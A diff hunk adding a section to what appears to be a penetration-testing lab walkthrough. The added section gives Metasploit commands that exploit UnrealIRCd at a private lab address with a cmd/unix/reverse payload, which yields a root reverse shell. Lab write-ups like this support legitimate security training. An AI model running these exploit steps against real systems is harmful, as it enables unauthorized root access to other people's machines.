@@ -103,6 +103,18 @@ From kali terminal:
 less -r out.txt # Open linpeas file
 ```
 
+From msfconsole:
+```bash
+search unrealirc
+use 0
+set RHOSTS 172.20.0.2
+set LHOST 172.20.0.3
+set payload cmd/unix/reverse
+exploit
+# this creates a shell
+whoami # root
+```
+
 Go back to the session:
 ```bash
 sessions -i* # list sessions
